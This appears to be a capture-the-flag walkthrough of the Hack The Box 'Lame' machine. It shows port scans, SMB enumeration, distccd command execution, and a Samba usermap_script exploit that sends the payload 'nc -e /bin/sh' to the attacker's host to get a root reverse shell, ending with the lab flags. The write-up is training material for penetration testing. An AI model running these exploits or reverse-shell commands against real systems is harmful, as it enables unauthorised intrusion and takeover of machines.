Spawn the VM and connec the VPN
10.10.10.3

Ping the VM to ensure its up, it responds to ICMP.  Not much else is known
Run an nmap scan:

```
sudo nmap -sV 10.10.10.3 -n -Pn -p- --max-rate 10000
Nmap scan report for 10.10.10.3
Host is up (0.30s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 325.03 seconds
```

ftp, ssh, smb and [distccd](https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc)

Run a UDP Nmap scan at it as well.

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 04:18 EDT
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.10.3
Host is up (0.30s latency).

PORT      STATE         SERVICE      VERSION
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.88 seconds
zsh: segmentation fault  sudo nmap -sV -sU 10.10.10.3 -n -p- --max-rate 10000 --top-ports 20
```


Enumerate to find out more detail:
```
enum4linux -a 10.10.10.3 > enum.txt
```

```
cat enum.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Oct 11 04:22:01 2022

 =========================================( Target Information )=========================================

Target ........... 10.10.10.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.10.10.3 )=============================


[E] Can't find workgroup/domain



 =================================( Nbtstat Information for 10.10.10.3 )=================================

Looking up status of 10.10.10.3
No reply from 10.10.10.3

 ====================================( Session Check on 10.10.10.3 )====================================


[+] Server 10.10.10.3 allows sessions using username '', password ''


 =================================( Getting domain SID for 10.10.10.3 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ====================================( OS information on 10.10.10.3 )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.10.3 from srvinfo:
        LAME           Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 ========================================( Users on 10.10.10.3 )========================================

index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 ==================================( Share Enumeration on 10.10.10.3 )==================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

[+] Attempting to map shares on 10.10.10.3

//10.10.10.3/print$     Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.3/tmp        Mapping: OK Listing: OK Writing: N/A
//10.10.10.3/opt        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//10.10.10.3/IPC$       Mapping: N/A Listing: N/A Writing: N/A
//10.10.10.3/ADMIN$     Mapping: DENIED Listing: N/A Writing: N/A

 =============================( Password Policy Information for 10.10.10.3 )=============================



[+] Attaching to 10.10.10.3 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] LAME
        [+] Builtin

[+] Password Info for Domain: LAME

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 0


 ========================================( Groups on 10.10.10.3 )========================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ===================( Users on 10.10.10.3 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID:
S-1-5-21-2446995257-2525374255-2673161615

[+] Enumerating users using SID S-1-5-21-2446995257-2525374255-2673161615 and logon username '', password ''

S-1-5-21-2446995257-2525374255-2673161615-500 LAME\Administrator (Local User)
S-1-5-21-2446995257-2525374255-2673161615-501 LAME\nobody (Local User)
S-1-5-21-2446995257-2525374255-2673161615-512 LAME\Domain Admins (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-513 LAME\Domain Users (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-514 LAME\Domain Guests (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1000 LAME\root (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1001 LAME\root (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1002 LAME\daemon (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1003 LAME\daemon (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1004 LAME\bin (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1005 LAME\bin (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1006 LAME\sys (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1007 LAME\sys (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1008 LAME\sync (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1009 LAME\adm (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1010 LAME\games (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1011 LAME\tty (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1012 LAME\man (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1013 LAME\disk (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1014 LAME\lp (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1015 LAME\lp (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1016 LAME\mail (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1017 LAME\mail (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1018 LAME\news (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1019 LAME\news (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1020 LAME\uucp (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1021 LAME\uucp (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1025 LAME\man (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1026 LAME\proxy (Local User)
S-1-5-21-2446995257-2525374255-2673161615-1027 LAME\proxy (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1031 LAME\kmem (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1041 LAME\dialout (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1043 LAME\fax (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1045 LAME\voice (Domain Group)
S-1-5-21-2446995257-2525374255-2673161615-1049 LAME\cdrom (Domain Group)

 ================================( Getting printer info for 10.10.10.3 )================================

No printers returned.


enum4linux complete on Tue Oct 11 04:30:05 2022
```

We can see there is a /tmp/ disk share
User accounts for user, and msfadmin

Use Metasploit to check SMB versions
```
msf6 > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf6 auxiliary(scanner/smb/smb_version) > get RHOSTS
RHOSTS => 10.10.10.3
msf6 auxiliary(scanner/smb/smb_version) > exploit

[*] 10.10.10.3:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.10.10.3:445        -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.10.10.3:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Connected to the tmp share as anonymous had a look around, nothing much to be found

Ran responder:
```
sudo responder -I tun0 -P -v
```

No responses

Looking at the specific version of distccd installed, 4.2.4, lead me to https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855 and CVE-2004-2687.

In the comments the code written by vvombat seemed to do the trick:
```
[*] Connected to remote service

--- BEGIN BUFFER ---

5575.jsvc_up
distcc_1fac3392.stderr
distcc_1fe23392.stdout
distccd_1c203392.o
distccd_1c3b3392.i
vgauthsvclog.txt.0
vmware-root


--- END BUFFER ---

[*] Done.
```

```
$ sudo python3 distccd.py -t 10.10.10.3 -c 'cat /etc/passwd'
[*] Connected to remote service

--- BEGIN BUFFER ---

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
makis:x:1003:1003::/home/makis:/bin/sh


--- END BUFFER ---

[*] Done.
```

Keep seeing what is around:

```
 sudo python3 distccd.py -t 10.10.10.3 -c 'ls /root/'
[*] Connected to remote service

--- BEGIN BUFFER ---

Desktop
reset_logs.sh
root.txt
vnc.log


--- END BUFFER ---

[*] Done.

$ sudo python3 distccd.py -t 10.10.10.3 -c 'cat /root/root.txt'
[*] Connected to remote service

--- BEGIN BUFFER ---

cat: /root/root.txt: Permission denied


--- END BUFFER ---

[*] Done.

$ sudo python3 distccd.py -t 10.10.10.3 -c 'cat /root/vnc.log'
[*] Connected to remote service

--- BEGIN BUFFER ---


New 'X' desktop is lame:0

Starting applications specified in /root/.vnc/xstartup
Log file is /root/.vnc/lame:0.log



--- END BUFFER ---

[*] Done.

$ sudo python3 distccd.py -t 10.10.10.3 -c 'cat /root/reset_logs.sh'
[*] Connected to remote service

--- BEGIN BUFFER ---

cat: /root/reset_logs.sh: Permission denied


--- END BUFFER ---

[*] Done.

sudo python3 distccd.py -t 10.10.10.3 -c 'ls -la  /root/'
[*] Connected to remote service

--- BEGIN BUFFER ---

total 80
drwxr-xr-x 13 root root 4096 Oct 11 04:06 .
drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
-rw-------  1 root root  373 Oct 11 04:06 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Oct 11 04:06 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Oct 11 04:06 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Oct 11 04:05 root.txt
-rw-r--r--  1 root root  118 Oct 11 04:06 vnc.log


--- END BUFFER ---

[*] Done.
```

Looking at the files and directories doesn't give us much to work with.

Who are we ?

```
└─$ sudo python3 distccd.py -t 10.10.10.3 -c 'whoami'
[*] Connected to remote service

--- BEGIN BUFFER ---

daemon


--- END BUFFER ---

[*] Done.

┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 distccd.py -t 10.10.10.3 -c 'set'
[*] Connected to remote service

--- BEGIN BUFFER ---

BASH=/bin/sh
BASH_ARGC=([0]="4")
BASH_ARGV=([0]="/tmp/distccd_6106363d.o" [1]="-o" [2]="/tmp/distccd_611e363d.i" [3]="-c")
BASH_EXECUTION_STRING=set
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="3" [1]="2" [2]="33" [3]="1" [4]="release" [5]="i486-pc-linux-gnu")
BASH_VERSION='3.2.33(1)-release'
DIRSTACK=()
EUID=1
GROUPS=()
HOSTNAME=lame
HOSTTYPE=i486
IFS='
'
MACHTYPE=i486-pc-linux-gnu
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/sbin:/bin:/usr/sbin:/usr/bin
POSIXLY_CORRECT=y
PPID=5491
PREVLEVEL=N
PS4='+ '
PWD=/tmp
QUIET=no
RUNLEVEL=2
SHELL=/bin/sh
SHELLOPTS=braceexpand:hashall:interactive-comments:posix
SHLVL=3
TERM=linux
UID=1
UPSTART_EVENT=runlevel
UPSTART_JOB=rc2
UPSTART_JOB_ID=5
VERBOSE=no
_=/usr/bin/distccd
_DISTCC_SAFEGUARD=1
previous=N
runlevel=2


--- END BUFFER ---

[*] Done.
```

look at cron jobs:
```
 sudo python3 distccd.py -t 10.10.10.3 -c 'ls /etc/cron*'
[*] Connected to remote service

--- BEGIN BUFFER ---

/etc/crontab

/etc/cron.d:
php5
postgresql-common

/etc/cron.daily:
apache2
apt
aptitude
bsdmainutils
logrotate
man-db
mlocate
samba
standard
sysklogd
tomcat55

/etc/cron.hourly:

/etc/cron.monthly:
proftpd
standard

/etc/cron.weekly:
man-db
popularity-contest
sysklogd


--- END BUFFER ---

[*] Done.
```

Looking through those I didn't find anything of interest.

Looking at ftp, we can get a copy of the /etc/vsftpd.conf file by running 
```
sudo python3 distccd.py -t 10.10.10.3 -c 'cat /etc/vsftpd.conf > set.txt'
```

Getting the file via the /tmp/ smb share, and looking at it.

It contains anonymous logon with write.  Lets try it.
```
$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Trying to upload files failed with access denied.

Attempting msfconsole vsftpd exploits also failed.

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

Look at the SMB Version
```
msf6 > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.3:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.10.10.3:445        -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.10.10.3:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
```

Setup a reverse shell:

```
$ sudo nc -l -p 14444 -vvv
[sudo] password for kali:
listening on [any] 14444 ...
```

Grab the exploit code from here https://github.com/Ziemni/CVE-2007-2447-in-Python/blob/master/smbExploit.py

and run the exploit:

```
sudo python smbexploit.py 10.10.10.3 139 'nc -e /bin/sh 10.10.14.8 14444'
```

```
10.10.10.3: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 47254
pwd
/
whoami
root
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
6c6b07d9565ff37cf7bb58cb8098cf0b
```

Using the remote shell we can navigate to /home/makis and get the user.txt flag.

```
cd makis
ls -la
total 36
drwxr-xr-x 4 makis makis 4096 Oct 11 06:25 .
drwxr-xr-x 6 root  root  4096 Mar 14  2017 ..
-rw------- 1 makis makis 1107 Mar 14  2017 .bash_history
-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
-rw-r--r-- 1 makis makis 2928 Mar 14  2017 .bashrc
drwx------ 2 makis makis 4096 Oct 11 06:25 .gconf
drwx------ 2 makis makis 4096 Oct 11 06:25 .gconfd
-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
-rw-r--r-- 1 makis makis   33 Oct 11 04:05 user.txt
cat user.txt
2796c77411f022fa0ac1a7b069d3440f
```

